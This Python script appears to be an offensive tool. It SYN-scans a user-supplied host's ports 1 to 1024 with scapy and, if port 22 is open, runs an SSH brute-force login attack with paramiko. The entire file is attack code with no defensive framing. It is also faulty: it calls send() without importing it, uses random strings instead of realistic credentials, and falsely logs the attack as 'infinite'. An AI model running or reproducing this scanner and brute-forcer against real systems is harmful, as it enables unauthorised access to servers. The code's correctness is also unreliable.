import socket
import paramiko
import threading
import random
import string
import os
import platform
import logging
from urllib.parse import urlparse
from scapy.all import sr1, IP, TCP

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def resolve_url(url):
    try:
        if not urlparse(url).scheme:
            url = 'http://' + url
        hostname = urlparse(url).hostname
        return socket.gethostbyname(hostname)
    except Exception as e:
        logging.error(f"Failed to resolve URL: {e}")
        return None


def scan_port(host, port, open_ports):
    scan = IP(dst=host) / TCP(dport=port, flags='S')
    resp = sr1(scan, verbose=0, timeout=0.5)

    if resp and resp.haslayer(TCP) and resp.getlayer(TCP).flags == 0x12:
        open_ports.append(port)
        logging.info(f"Port {port} is open on {host}")
        send(IP(dst=host) / TCP(dport=port, flags='R'))  # Reset connection


def tcp_scan(target, ports_to_scan=None):
    open_ports = []
    ports = ports_to_scan if ports_to_scan else range(1, 1025)  # Scan common ports
    threads = []

    for port in ports:
        thread = threading.Thread(target=scan_port, args=(target, port, open_ports))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    return open_ports


def generate_credentials(num_entries=1000000, min_length=1, max_length=16):
    usernames = [''.join(random.choices(string.ascii_letters + string.digits + string.punctuation,
                                        k=random.randint(min_length, max_length))) for _ in range(num_entries)]
    passwords = [''.join(random.choices(string.ascii_letters + string.digits + string.punctuation,
                                        k=random.randint(min_length, max_length))) for _ in range(num_entries)]
    return usernames, passwords


def ssh_brute_force(host, port):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    usernames, passwords = generate_credentials()

    logging.info("Starting infinite SSH brute-force attack...")

    for username, password in zip(usernames, passwords):
        try:
            ssh_client.connect(host, port, username, password, timeout=5)
            logging.info(f"SSH login found! Username: {username}, Password: {password}")
            return True
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            logging.error(f"SSH brute-force attempt failed: {e}")
            return False


def main():
    os.system('cls' if platform.system().lower() == 'windows' else 'clear')
    target_url = input("Enter target URL: ")
    target_host = resolve_url(target_url)

    if not target_host:
        logging.error("Invalid target.")
        return

    logging.info(f"Scanning {target_host}...")
    open_ports = tcp_scan(target_host)
    logging.info(f"Open ports: {open_ports}")

    if 22 in open_ports:
        confirmation = input("Port 22 is open. Do you want to attempt SSH brute-force? (yes/no): ")
        if confirmation.lower() == 'yes':
            ssh_brute_force(target_host, 22)
        else:
            logging.info("SSH brute-force attack skipped.")
    else:
        logging.info("Port 22 (SSH) is closed.")


if __name__ == "__main__":
    main()
